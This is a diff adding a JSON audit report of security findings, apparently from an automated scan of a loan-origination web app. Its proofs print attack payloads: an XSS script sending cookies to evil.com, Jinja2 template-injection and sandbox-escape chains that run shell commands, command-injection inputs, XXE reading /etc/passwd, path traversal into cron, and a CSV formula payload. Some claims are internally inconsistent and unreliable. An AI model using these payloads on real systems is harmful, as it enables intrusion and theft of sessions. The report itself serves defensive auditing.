@@ -1,0 +1,1076 @@
+{
+  "version": "twin-distill-flash-dsonly",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-502",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 61
+      },
+      "end": {
+        "line": 61
+      },
+      "extra": {
+        "message": "Pickle deserialization leads to remote code execution",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-502"
+          ],
+          "citation": "bundle = pickle.loads(raw)",
+          "proof": "POST /ops/bundle/loan-thaw-178 reads the raw request body (or query param 'blob'), optionally base64-decoded via 'wrap=b64', and feeds it directly to pickle.loads(). Pickle deserialization executes arbitrary Python code embedded in the payload. The _wrk_gate guard requires the x-internal-token header, but if INTERNAL_OPS_TOKEN is unset the guard is bypassed because gate_value is falsy, raising 403 before reaching pickle. When INTERNAL_OPS_TOKEN IS set, any user or service possessing it can achieve RCE."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 150
+      },
+      "end": {
+        "line": 150
+      },
+      "extra": {
+        "message": "OS command injection via unsanitized host parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "status = _os.system(\"ping -c 1 \" + host)",
+          "proof": "GET /ops/shell/loan-probe-635 takes a user-supplied query parameter 'host' (default \"127.0.0.1\") and concatenates it directly into an os.system() call. An attacker can send ?host=127.0.0.1;id or ?host=$(id) to execute arbitrary shell commands. The _wrk_gate guard can be bypassed when INTERNAL_OPS_TOKEN is unset, or exploited by any internal actor who knows the token."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1336",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 115
+      },
+      "end": {
+        "line": 115
+      },
+      "extra": {
+        "message": "Server-Side Template Injection (SSTI) enables RCE via Jinja2",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-1336"
+          ],
+          "citation": "body = Template(\"Result: \" + fragment).render()",
+          "proof": "GET /ops/jinja/loan-cast-583 concatenates the user-supplied 'fragment' query parameter directly into a Jinja2 template string, then renders it. Classic SSTI. An attacker can inject Jinja2 expressions like {{config.__class__.__init__.__globals__['os'].popen('id').read()}} to execute arbitrary system commands. The _wrk_gate guard applies but is bypassable when INTERNAL_OPS_TOKEN is unset."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-95",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 73
+      },
+      "end": {
+        "line": 73
+      },
+      "extra": {
+        "message": "Eval() injection with restricted globals still escapable to RCE",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-95"
+          ],
+          "citation": "result = eval(expr, {\"__builtins__\": {}}, {\"amount\": 42, \"fee\": 7})",
+          "proof": "GET /ops/formula/loan-cast-261 passes the user-supplied 'expr' query parameter to eval(). While __builtins__ is set to {}, classic Python sandbox escapes work via (1).__class__.__mro__[1].__subclasses__() to access dangerous modules and execute shell commands. The _wrk_gate guard is the same bypassable pattern."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-611",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 136
+      },
+      "end": {
+        "line": 136
+      },
+      "extra": {
+        "message": "XXE (XML External Entity Injection) allows arbitrary file read and SSRF",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-611"
+          ],
+          "citation": "parser = etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)\ndoc = etree.fromstring(await request.body(), parser)",
+          "proof": "POST /ops/xml/loan-fold-614 parses the request body as XML with load_dtd=True, resolve_entities=True, and no_network=False \u2014 all three flags that enable XXE. An attacker can send a payload with a SYSTEM entity referencing file:///etc/passwd to read arbitrary server files, or use SYSTEM http://internal-admin/ for SSRF against internal services."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 121
+      },
+      "end": {
+        "line": 121
+      },
+      "extra": {
+        "message": "Path traversal in file write endpoint allows arbitrary file creation",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "target = BASE_EXPORT_DIR / name\ntarget.parent.mkdir(parents=True, exist_ok=True)\ntarget.write_bytes(body)",
+          "proof": "POST /ops/dock/loan-shelf-594 accepts a user-supplied query parameter 'name' (default \"packet.bin\") and writes the request body to BASE_EXPORT_DIR / name. The 'name' parameter is never sanitized for path traversal sequences. An attacker can send ?name=../../etc/cron.d/malicious with a body containing a cron job to achieve code execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-942",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 101
+      },
+      "end": {
+        "line": 101
+      },
+      "extra": {
+        "message": "CORS misconfiguration with credential reflection enables credential theft",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-942"
+          ],
+          "citation": "response.headers[\"Access-Control-Allow-Origin\"] = origin\nresponse.headers[\"Access-Control-Allow-Credentials\"] = \"true\"",
+          "proof": "GET /ops/origin/loan-mirror-565 echoes back the Origin request header as Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: true. Any attacker-controlled website can make a fetch() request to this endpoint with credentials: 'include', read the response, and exfiltrate session cookies or API keys, bypassing the Same-Origin Policy entirely for any origin."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app/security.py",
+      "start": {
+        "line": 13
+      },
+      "end": {
+        "line": 13
+      },
+      "extra": {
+        "message": "Hardcoded weak JWT signing secret allows session forgery",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "SECRET_KEY = os.getenv(\"SECRET_KEY\", \"dev-only-change-me-for-local-runs\")",
+          "proof": "If the SECRET_KEY environment variable is not set (e.g. in production deployment where env was missed), the code falls back to the hardcoded string 'dev-only-change-me-for-local-runs'. An attacker can forge arbitrary JWT session tokens for any user/role by signing with this known key using HS256, enabling privilege escalation and account takeover."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "app/main.py",
+      "start": {
+        "line": 1249
+      },
+      "end": {
+        "line": 1249
+      },
+      "extra": {
+        "message": "IDOR: support_specialist role can access any borrower's full PII",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if user.role == \"borrower\" and profile.user_id != user.id:\n    raise HTTPException(status_code=403, detail=\"Borrower profile is not accessible\")\nelif user.role == \"underwriter\":\n    allowed = db.scalar(...)\n    if not allowed:\n        raise HTTPException(status_code=403, detail=\"Borrower profile is not accessible\")",
+          "proof": "GET /api/borrowers/{borrower_id} applies role-based scoping only for 'borrower' and 'underwriter' roles. The 'support_specialist' and 'admin' roles fall through the if/elif chain with NO access check. A support_specialist can enumerate borrower IDs and retrieve full PII (business_name, legal_name, tax_identifier_last4, owner_name, owner_email, owner_phone, address_line1, city, state, postal_code) for every borrower with no authorization boundary."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 85
+      },
+      "end": {
+        "line": 85
+      },
+      "extra": {
+        "message": "Reflected XSS via Jinja2 safe filter with user-controlled input",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "body = Template(\"{{ card|safe }}\").render(card=card)",
+          "proof": "GET /ops/blurb/loan-tile-326 passes the user-supplied 'card' query parameter to a Jinja2 template that uses the |safe filter, which disables HTML escaping. An attacker can supply ?card=<script>document.location='https://evil.com/?c='+document.cookie</script> to execute arbitrary JavaScript. The response Content-Type is text/html."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-601",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 39
+      },
+      "end": {
+        "line": 39
+      },
+      "extra": {
+        "message": "Open redirect via unsanitized URL parameter",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-601"
+          ],
+          "citation": "return RedirectResponse(lane)",
+          "proof": "GET /ops/after/loan-aftercard-069 takes a user-supplied query parameter 'lane' (default '/') and returns a 302 redirect to that value with no validation. An attacker can craft ?lane=https://phishing-site.com to redirect victims to arbitrary external domains, enabling phishing attacks against internal tool users."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-295",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 157
+      },
+      "end": {
+        "line": 157
+      },
+      "extra": {
+        "message": "SSL/TLS certificate verification disabled for outbound HTTPS requests",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-295"
+          ],
+          "citation": "ctx = ssl._create_unverified_context()\nurllib.request.urlopen(endpoint, timeout=2, context=ctx)",
+          "proof": "GET /ops/trust/loan-drift-645 calls urllib.request.urlopen() with ssl._create_unverified_context(), which disables all certificate validation. An attacker on the network path can perform a man-in-the-middle attack, intercept the HTTPS connection to partner.invalid, and inject malicious responses or capture sensitive data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 116
+      },
+      "end": {
+        "line": 116
+      },
+      "extra": {
+        "message": "Server-Side Template Injection (SSTI) via Jinja2 template string concatenation",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "body = Template(\"Result: \" + fragment).render()",
+          "proof": "Untrusted SOURCE: The 'fragment' query parameter (default '{{ 7 * 7 }}') is attacker-controlled via URL query string. SINK: The fragment is concatenated directly into the Jinja2 template source string at line 116 ('Template(\"Result: \" + fragment).render()'), then rendered. An attacker can inject arbitrary Jinja2 expressions like '{{ config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read() }}' to achieve server-side template injection and Remote Code Execution."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 66
+      },
+      "end": {
+        "line": 66
+      },
+      "extra": {
+        "message": "Mass Assignment via unrestricted dictionary update on authorization object",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "workset.update(payload)",
+          "proof": "Untrusted SOURCE: The JSON request body (via await request.json() at line 65) is attacker-controlled. SINK: workset.update(payload) at line 66 merges all attacker-supplied fields directly into an authorization object with no whitelist or field validation. An attacker can set '{\"role\": \"admin\", \"approved\": true, \"tier\": \"premium\"}' to escalate privileges beyond the intended defaults of '{\"role\": \"viewer\", \"approved\": false, \"balance\": 0}'."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-330",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 131
+      },
+      "end": {
+        "line": 131
+      },
+      "extra": {
+        "message": "Use of cryptographically insecure random number generator for token generation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-330"
+          ],
+          "citation": "code = \"\".join(random.choice(alphabet) for _ in range(length))",
+          "proof": "The code uses Python's random module (Mersenne Twister PRNG) at line 131 rather than the secrets module, which is not suitable for security-sensitive contexts. The generated tokens at /ops/nonce/loan-roll-605 are predictable if the RNG state can be inferred, allowing attackers to guess or brute-force tokens that may be used for security purposes."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-532",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 32
+      },
+      "end": {
+        "line": 32
+      },
+      "extra": {
+        "message": "Authorization header and request body logged to application logs",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-532"
+          ],
+          "citation": "logger.warning(\"underwriting intake body=%s auth=%s\", wire_text, request.headers.get(\"authorization\"))",
+          "proof": "Untrusted SOURCE: The full HTTP request body (via await request.body() at line 31) and the Authorization header (via request.headers.get('authorization')) are attacker-controlled inputs. SINK: Both values are passed directly to logger.warning() at line 32, which writes them to the application log file. An attacker can inject arbitrary bearer tokens in the Authorization header that will be persisted in plaintext in log files, allowing any party with filesystem access to capture sensitive credentials."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-640",
+      "path": "app/main.py",
+      "start": {
+        "line": 687
+      },
+      "end": {
+        "line": 687
+      },
+      "extra": {
+        "message": "Plaintext password reset token written to local log file",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-640"
+          ],
+          "citation": "mock_log(\"email.log\", {\"to\": user.email, \"template\": \"password_reset\", \"reset_token\": raw_token})",
+          "proof": "SOURCE: new_urlsafe_token('reset_') at line 685 generates a raw plaintext password reset token. SINK: The raw token is passed to mock_log() at line 687, which serializes it to 'storage/mock_logs/email.log' on disk. An attacker who gains access to this log file (e.g., through path traversal, server misconfiguration, or local file read) can read any user's valid password reset token and reset their password without the email owner's knowledge."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "app/main.py",
+      "start": {
+        "line": 626
+      },
+      "end": {
+        "line": 626
+      },
+      "extra": {
+        "message": "User enumeration via distinct registration response for existing emails",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "existing = db.scalar(select(User).where(User.email == payload.email))\nif existing:\n    raise HTTPException(status_code=409, detail=\"Email is already registered\")",
+          "proof": "SOURCE: The payload.email field is attacker-controlled user input submitted to the POST /api/auth/register endpoint. SINK: At line 626, the endpoint queries the database for the email. If the email exists, it returns HTTP 409 with detail 'Email is already registered'; if not, it returns HTTP 201 with the user object. This response discrepancy allows an attacker to enumerate valid registered email addresses by probing the registration endpoint."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 659
+      },
+      "end": {
+        "line": 659
+      },
+      "extra": {
+        "message": "No rate limiting on login endpoint enabling brute-force attacks",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.post(\"/api/auth/login\")\ndef login(payload: LoginIn, request: Request, response: Response, db: Session = Depends(get_db)) -> dict[str, Any]:",
+          "proof": "SOURCE: The login endpoint at line 659 accepts unlimited requests with attacker-supplied email and password combinations. SINK: There is no rate-limiting decorator, no IP-based throttling, no account lockout mechanism, and no CAPTCHA on the POST /api/auth/login endpoint. An attacker can send thousands of password guesses per second against any user account without being blocked, enabling credential brute-force attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "app/main.py",
+      "start": {
+        "line": 1277
+      },
+      "end": {
+        "line": 1277
+      },
+      "extra": {
+        "message": "Insecure Direct Object Reference: support_specialist can modify any borrower's full PII via PATCH endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if user.role not in {\"admin\", \"support_specialist\", \"borrower\"}:\n    raise HTTPException(status_code=403, detail=\"Insufficient permissions\")\napply_profile_update(profile, payload)",
+          "proof": "SOURCE: The borrower_id path parameter is attacker-controlled and specifies which BorrowerProfile to modify. SINK: At line 1275-1277, the authorization check allows support_specialist to pass through without verifying they are associated with the target borrower. The support_specialist role can update any borrower's business_name, legal_name, owner_name, owner_email, owner_phone, address_line1, city, state, postal_code, industry, annual_revenue, and years_in_business (fields in BorrowerProfileUpdateIn). This is a WRITE-IDOR \u2014 an attacker with support_specialist privileges can silently modify any borrower's PII and financial data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1021",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 109
+      },
+      "end": {
+        "line": 109
+      },
+      "extra": {
+        "message": "XSS-Protection and Content-Security-Policy headers deliberately disabled",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1021"
+          ],
+          "citation": "response.headers[\"X-XSS-Protection\"] = \"0\"\nresponse.headers[\"Content-Security-Policy\"] = \"\"",
+          "proof": "SOURCE: The function at lines 109-110 explicitly sets X-XSS-Protection to '0' (disabling the browser's built-in reflected XSS filter) and Content-Security-Policy to an empty string (disabling CSP protections). SINK: These response headers are served to the browser via the /ops/frame/loan-slip-575 endpoint, removing both the legacy XSS filter and modern CSP protections. This makes the application more vulnerable to XSS and clickjacking attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 91
+      },
+      "end": {
+        "line": 91
+      },
+      "extra": {
+        "message": "Hardcoded static credential verifiers in source code",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "known = {\"north\": \"4812\", \"south\": \"5930\"}",
+          "proof": "SOURCE: The dictionary 'known' at line 91 contains hardcoded verifier strings ('north'='4812', 'south'='5930') baked into the source code. SINK: At lines 93-94, these values are compared against the attacker-supplied verifier parameter. Anyone with read access to the source (e.g., through repository leak, source map exposure, or path traversal) can extract these static credentials, bypass the verification step, and authenticate as any hardcoded handle value at /ops/identity/loan-hint-555."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1236",
+      "path": "app/main.py",
+      "start": {
+        "line": 1490
+      },
+      "end": {
+        "line": 1490
+      },
+      "extra": {
+        "message": "CSV Formula Injection via unsanitized data in CSV exports",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-1236"
+          ],
+          "citation": "def csv_response(filename: str, rows: list[dict[str, Any]]) -> StreamingResponse:\n    output = io.StringIO()\n    if rows:\n        writer = csv.DictWriter(output, fieldnames=list(rows[0].keys()))\n        writer.writeheader()\n        writer.writerows(rows)",
+          "proof": "SOURCE 1: The 'purpose' field in POST /api/applications (line ~856) and the 'borrower_summary' field in POST /api/applications/{id}/decisions (DecisionIn model) are attacker-controlled or user-controlled values stored in the database without formula sanitization. SINK: csv_response() at line 1490 uses Python's csv.DictWriter which writes cell values verbatim. When exported via /api/admin/exports/decisions (line 1532) or /api/admin/exports/applications (line 1504), the CSV output contains raw formula-injection characters (e.g., '=cmd|' /C calc'!A0'). If opened in Excel or LibreOffice, the formula executes, enabling arbitrary command execution on the admin's machine."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "app/main.py",
+      "start": {
+        "line": 1039
+      },
+      "end": {
+        "line": 1039
+      },
+      "extra": {
+        "message": "File upload content-type validation bypass via client-supplied Content-Type header",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "if upload.content_type not in ALLOWED_CONTENT_TYPES:\n    raise HTTPException(status_code=400, detail=\"Unsupported file type\")",
+          "proof": "SOURCE: The 'upload.content_type' property at line 1039 derives from the HTTP Content-Type header sent by the client, which is fully attacker-controlled. VALIDATION: ALLOWED_CONTENT_TYPES (lines 46-52) restricts to PDF, plain text, CSV, PNG, JPEG, and Excel types, but the check uses the client-supplied value, not server-detected MIME type from file magic bytes. SINK: The file content is written to disk as-is (line 1047), and document.content_type is set to the spoofed value (line 1051). The download endpoint at line 1079 serves the file with the spoofed content-type. An attacker can bypass the allowlist by setting Content-Type to 'application/pdf' while uploading a malicious executable or HTML file."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 835
+      },
+      "end": {
+        "line": 835
+      },
+      "extra": {
+        "message": "Denial of Service via LIKE wildcard injection in search endpoint",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "like = f\"%{q.strip()}%\"\n        stmt = stmt.where(or_(BorrowerProfile.business_name.ilike(like), LoanApplication.purpose.ilike(like)))",
+          "proof": "SOURCE: The `q` query parameter in GET /api/applications (line 826) is user-controlled and has no max_length constraint. PRODUCTION: At line 835, `q.strip()` is interpolated into a SQL ILIKE pattern with prepended/appended `%` wildcards without escaping existing LIKE metacharacters. SINK: An attacker can send a long string of `%` and `_` wildcards (e.g., `q=%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%`), producing an ILIKE pattern that forces PostgreSQL to evaluate an exponential number of character-match permutations, exhausting database CPU and causing denial of service for all users."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "app/main.py",
+      "start": {
+        "line": 85
+      },
+      "end": {
+        "line": 85
+      },
+      "extra": {
+        "message": "No CSRF protection on any state-changing route",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "app = FastAPI(title=\"Loan Origination Portal\", version=\"1.0.0\")\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\n        \"http://localhost:5173\",\n        \"http://127.0.0.1:5173\",\n        \"http://localhost:8000\",\n        \"http://127.0.0.1:8000\",\n    ],\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)",
+          "proof": "The app uses cookie-based session authentication (JWT in `loan_session` cookie set at security.py:52) but configures no CSRF middleware, no Origin/Referer header check, and no anti-CSRF token. Every POST/PUT/PATCH/DELETE endpoint (register, login, logout, update_profile, create/update/delete application, submit/withdraw/claim application, upload/review documents, create messages/notes/decisions, admin CRUD endpoints, and all /ops/* routes) can be targeted by a cross-site request forgery attack. An attacker hosts a malicious page that submits an authenticated victim's browser to perform unintended state changes because the cookie is automatically sent cross-origin."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app/database.py",
+      "start": {
+        "line": 13
+      },
+      "end": {
+        "line": 13
+      },
+      "extra": {
+        "message": "Hardcoded default database credentials in source code",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "DATABASE_URL = os.getenv(\n    \"DATABASE_URL\",\n    \"postgresql+psycopg://postgres:postgres@localhost:5432/loan_portal\",\n)",
+          "proof": "The DATABASE_URL fallback embeds the credentials `postgres:postgres` (user:password) directly in source code. If the DATABASE_URL environment variable is unset (e.g., in a freshly deployed or misconfigured environment), the application connects to PostgreSQL with well-known default credentials that allow anyone on the network to authenticate."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "scripts/seed.py",
+      "start": {
+        "line": 34
+      },
+      "end": {
+        "line": 34
+      },
+      "extra": {
+        "message": "Hardcoded weak demo password shared across all seeded accounts",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "DEMO_PASSWORD = \"DemoPass123!\"",
+          "proof": "A single weak password \"DemoPass123!\" is hardcoded in source and used for every seeded user account: admin, underwriter, underwriter2, support_specialist, and borrower (lines 49-55). The same password is also referenced in scripts/smoke_check.py:15 and tests/test_authorization_workflows.py:18. Anyone who reads the seed file gains access to all demo accounts, including the admin account."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "app/security.py",
+      "start": {
+        "line": 56
+      },
+      "end": {
+        "line": 56
+      },
+      "extra": {
+        "message": "Session cookie Secure flag disabled by default",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "secure_cookie = os.getenv(\"COOKIE_SECURE\", \"false\").lower() == \"true\"\n    response.set_cookie(\n        SESSION_COOKIE_NAME,\n        token,\n        httponly=True,\n        secure=secure_cookie,",
+          "proof": "The `COOKIE_SECURE` environment variable defaults to `\"false\"` (line 56), so the session cookie's Secure attribute is False unless explicitly overridden. This means the JWT session token is transmitted over unencrypted HTTP connections, enabling network-level attackers (MITM) to intercept and steal the session cookie. The .env.example file also sets `COOKIE_SECURE=false`."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "app/security.py",
+      "start": {
+        "line": 14
+      },
+      "end": {
+        "line": 14
+      },
+      "extra": {
+        "message": "Excessive session lifetime of 12 hours",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "SESSION_TTL_MINUTES = int(os.getenv(\"SESSION_TTL_MINUTES\", \"720\"))",
+          "proof": "The default session TTL is 720 minutes (12 hours), set at security.py:14. Combined with no session invalidation on password change (main.py:711-714) and no refresh-token rotation mechanism, a stolen JWT remains valid for up to 12 hours. This greatly amplifies the impact of any session hijacking or XSS attack."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 625
+      },
+      "end": {
+        "line": 625
+      },
+      "extra": {
+        "message": "Missing rate limiting on user registration endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.post(\"/api/auth/register\")\ndef register(payload: RegisterIn, request: Request, response: Response, db: Session = Depends(get_db)) -> dict[str, Any]:",
+          "proof": "The `/api/auth/register` endpoint (line 625) has no rate limiting or throttling. An attacker can automate mass account creation to exhaust the database storage, perform credential stuffing against email providers, or create thousands of borrower profiles for phishing campaigns. Unlike the login endpoint (which already has an existing finding for missing rate limiting at main.py:649), the register endpoint is an independent unthrottled attack surface for account creation abuse."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 684
+      },
+      "end": {
+        "line": 684
+      },
+      "extra": {
+        "message": "Missing rate limiting on password-reset request endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.post(\"/api/auth/password-reset/request\")\ndef password_reset_request(payload: PasswordResetRequestIn, request: Request, db: Session = Depends(get_db)) -> dict[str, Any]:",
+          "proof": "The `/api/auth/password-reset/request` endpoint (line 684) has no rate limiting, allowing an attacker to spam password reset emails/tokens for any known email address (user enumeration is already confirmed at main.py:627). This causes mailbox flooding and generates excessive `mock_log(\"email.log\", ...)` writes, potentially exhausting disk space in the mock_logs directory."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/main.py",
+      "start": {
+        "line": 696
+      },
+      "end": {
+        "line": 696
+      },
+      "extra": {
+        "message": "Missing rate limiting on password-reset confirmation endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.post(\"/api/auth/password-reset/confirm\")\ndef password_reset_confirm(payload: PasswordResetConfirmIn, request: Request, db: Session = Depends(get_db)) -> dict[str, Any]:",
+          "proof": "The `/api/auth/password-reset/confirm` endpoint (line 696) has no rate limiting on the token parameter. An attacker can brute-force reset tokens because `hash_token` (SHA-256 hexdigest) is predictable in length, and there is no exponential backoff or lockout. The already-found finding at main.py:649 covers only the login endpoint; this password-reset confirmation path is a separate unthrottled brute-force surface."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-915",
+      "path": "app/main.py",
+      "start": {
+        "line": 1318
+      },
+      "end": {
+        "line": 1318
+      },
+      "extra": {
+        "message": "Mass assignment via setattr loop in admin_update_user",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-915"
+          ],
+          "citation": "data = payload.model_dump(exclude_unset=True)\n    for field, value in data.items():\n        setattr(target, field, value)",
+          "proof": "The `admin_update_user` endpoint (line 1310) uses `payload.model_dump(exclude_unset=True)` and a `setattr` loop (lines 1318-1319) to apply updates to the User model. Although `UserUpdateIn` currently limits fields to `full_name`, `role`, and `is_active`, the pattern is fragile: any future addition to `UserUpdateIn` (or a subclass) would be blindly applied to the model, potentially allowing privilege escalation if a field like `password_hash` is accidentally included. Identical patterns exist at main.py:420-422 (`apply_profile_update` with `BorrowerProfileUpdateIn`), main.py:1355-1356 (`admin_update_product` with `ProductIn`), and main.py:1401-1402 (`admin_update_document_type` with `DocumentTypeIn`). These are distinct from the already-reported mass assignment at loan_operations.py:68."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "app/loan_operations.py",
+      "start": {
+        "line": 79
+      },
+      "end": {
+        "line": 79
+      },
+      "extra": {
+        "message": "Insecure cookie set from user-controlled query parameter without security attributes",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "response.set_cookie(\"portal_crumb\", marker)",
+          "proof": "The `/ops/crumb/loan-lane-296` endpoint (line 78) takes `marker` from the query string and sets it as a cookie value at line 79 with no `httponly`, `secure`, or `samesite` attributes. SOURCE: attacker-controlled query parameter `marker` -> SINK: `response.set_cookie(\"portal_crumb\", marker)`. An attacker can inject arbitrary cookie values (including session fixation payloads or XSS via cookie reflection) because the cookie has no security flags. This is a distinct vulnerability from the XSS at loan_operations.py:84 (which uses Jinja2 with `|safe`) and the CSP header disable at line 107."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "app/main.py",
+      "start": {
+        "line": 1627
+      },
+      "end": {
+        "line": 1627
+      },
+      "extra": {
+        "message": "Raw API key secret returned in API response",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "return {\"api_key\": {\"id\": key.id, \"name\": key.name, \"key_prefix\": key.key_prefix, \"raw_key\": raw_key}}",
+          "proof": "The `create_api_key` endpoint (line 1617) returns the full raw API key (`raw_key`) in the JSON response body at line 1627. If the response is logged by a reverse proxy, captured in API monitoring tools, or leaked via browser developer tools, the API key is compromised. The key provides full programmatic access to the `/api/integrations/*` endpoint, which exposes application status and decision data for any application."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "app/main.py",
+      "start": {
+        "line": 1664
+      },
+      "end": {
+        "line": 1664
+      },
+      "extra": {
+        "message": "Webhook signing secret returned in API response",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "return {\"webhook\": {\"id\": endpoint.id, \"name\": endpoint.name, \"secret_once\": secret}}",
+          "proof": "The create_webhook endpoint (line 1649) generates a webhook signing secret with new_urlsafe_token('whsec_') and returns it in the JSON response body at line 1664. Although labeled secret_once, the value is transmitted in the HTTP response and could be captured by any intermediary (proxy logs, client-side console, browser history). An attacker with this secret can forge webhook payloads that appear to originate from the legitimate application."
+        }
+      }
